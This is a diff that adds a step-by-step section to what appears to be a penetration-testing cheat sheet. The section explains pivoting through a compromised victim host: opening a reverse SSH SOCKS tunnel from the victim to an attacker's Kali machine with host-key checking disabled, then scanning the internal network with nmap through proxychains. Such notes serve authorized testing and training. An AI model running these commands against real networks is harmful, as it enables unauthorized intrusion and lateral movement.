@@ -321,6 +321,45 @@ Plink
 
 SSH
 
+1. Generate an SSH key pair on the box being pivoted through to protect your credentials.
+
+```
+ssh-keygen
+cat ~/.ssh/id_rsa.pub
+```
+
+2. Copy the pulic key output from the above command. Add this value and the pivot machine's IP address to the `~/.ssh/authorized_keys` file on your attacking (Kali) machine using the syntax below. If you do not already have this file, simple create a new file and add the contents below.
+
+```
+from="[VICTIM_MACHINE_IP_ADDRESS]",command="echo 'This account can only be used for port forwarding'",no-agent-forwarding,no-X11-forwarding,no-pty [PUBLIC_KEY_VALUE]
+```
+
+3. Ensure the SSH service is running on your attacking (Kali) machine.
+
+```
+sudo service ssh start
+```
+
+4. Initiate SSH call from the box being pivoted through and specify the `id_rsa` private key generated in step 1. This private key may be called something else if you changed the name when generating. Ensure the username and IP address of your attacking machine are correct.
+
+```
+ssh -f -N -R 1080 -o "UserKnownHostsFile=/dev/null" -o "StrictHostKeyChecking=no" -i /[PATH_TO_YOUR_PRIVATE_KEY]/id_rsa kali@[ATTACKING_MACHINE_IP]
+```
+
+5. Edit your `/etc/proxychains.conf` file to add the line below.
+
+```
+socks4 127.0.0.1 1080
+```
+
+6. Prepend the `proxychains` command to pivot through the compromised host using proxy chains. When scanning with `nmap`, be sure to use TCP Connect scans e.g.
+
+```
+sudo proxychains nmap -sT -p80 -sC -sV --open -Pn -n 10.10.10.10
+```
+
+Additional Notes:
+
 -   ssh user@10.10.10.10 -R 1234:127.0.0.1:1234
 -   ssh -D 1337 -q -C -N -f user@10.10.10.10 (https://ma.ttias.be/socks-proxy-linux-ssh-bypass-content-filters)
 
